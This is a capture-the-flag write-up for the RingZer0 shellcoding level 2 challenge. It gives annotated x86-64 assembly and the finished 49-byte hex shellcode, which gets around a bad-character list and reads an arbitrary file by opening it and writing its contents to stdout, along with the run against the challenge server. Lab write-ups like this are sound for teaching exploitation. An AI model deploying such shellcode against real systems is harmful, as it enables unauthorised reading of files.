@@ -1,0 +1,66 @@
+Level 2
+
+The password for level 2 is the flag of level 1. It seems the ante has been upped:
+
+RingZer0 Team CTF Shellcoding Level 2
+Submit your shellcode using hex representation "\xcc\xcd".
+Type "end" to exit.
+
+This level have shellcode restriction. Bad char list "\x0a\x0d\x2f\x2e\x62\x99" max size 50 bytes.
+You main goal is to read /flag/level2.flag
+
+So the previous shellcode goes right out the window. I needed to cut it in half, length-wise. Also, not all characters are allowed, so-called bad chars. This will restrict the instructions we can use in the shellcode. Let's have a look at how we can trim the fat off of the shellcode of level 1.
+
+First, hard-coding the filename is out of the question. That would waste at least 18 bytes, or 36% of the shellcode. Furthermore, it would contain the bad char 0x2f which is the slash /. Instead, I decided to read in the name of the file with a syscall; the rest of the shellcode then takes care of opening that file, reading from it and sending the bytes back to us.
+
+bits 64
+
+_start:
+xor rax, rax        ; syscall read = 0
+xor rdi, rdi        ; we'll read from stdin
+mov rsi, rsp        ; one byte shorter than 'lea rsi, [rsi]'
+push byte 18        ; number of bytes to read, enough for the filename
+pop rdx
+syscall
+
+xor rax, rax
+inc rax
+inc rax             ; syscall open
+                    ; instead of setting rdi to the filename (located on the stack),
+                    ; we re-use the fact that rdi is zero and rsi points to that filename
+xchg rsi, rdi       ; now rsi = 0 (O_RDONLY), and rdi points to the filename we just read
+syscall
+
+xchg rax, rsi       ; after this, rsi contains the filehandle of the opened file, rax contains 0
+xchg rdi, rsi       ; after this, rdi contains the filehandle and rsi points to the stack (a buffer!)
+push byte 127
+pop rdx             ; read 127 bytes, should be plenty
+syscall             ; because we set rax to 0, this will call syscall read
+
+xor rax, rax
+inc rax             ; syscall write
+mov rdi, rax        ; copy the value of rax to rdi (1 = stdout)
+                    ; rsi = still pointer to buffer
+                    ; rdx = still 0x7f
+syscall             ; grab the flag!
+
+Assembling the shellcode is done with the previous command. No bad chars made it into the shellcode, and we have one byte to spare!
+
+$ echo; nasm -f bin ./level2-shellcode.asm; xxd -c 1 ./level2-shellcode | awk '{print "\\x"$2 }' |tr -d '\n'; echo; wc -c ./level2-shellcode
+
+\x48\x31\xc0\x48\x31\xff\x48\x89\xe6\x6a\x12\x5a\x0f\x05\x48\x31\xc0\x48\xff\xc0\x48\xff\xc0\x48\x87\xf7\x0f\x05\x48\x96\x48\x87\xfe\x6a\x7f\x5a\x0f\x05\x48\x31\xc0\x48\xff\xc0\x48\x89\xc7\x0f\x05
+49 ./level2-shellcode
+
+Running it on the server:
+
+shellcode>\x48\x31\xc0\x48\x31\xff\x48\x89\xe6\x6a\x12\x5a\x0f\x05\x48\x31\xc0\x48\xff\xc0\x48\xff\xc0\x48\x87\xf7\x0f\x05\x48\x96\x48\x87\xfe\x6a\x7f\x5a\x0f\x05\x48\x31\xc0\x48\xff\xc0\x48\x89\xc7\x0f\x05
+    Shellcode received...
+    Shellcode length (49) bytes.
+
+    Success: Executing shellcode...
+
+/flag/level2.flag^@
+FLAG-<redacted>
+    Error: SIGSEGV received I think your shellcode is not working
+
+After succesfully executing the shellcode, it demands input on stdin. Specifically, it needs the filename which we want to read. Notice that the filename is terminated with a NULL byte: this can be done by typing in the correct filename and then pressing Ctrl+Space to send a NULL byte. When done, pressing enter will yield the flag!
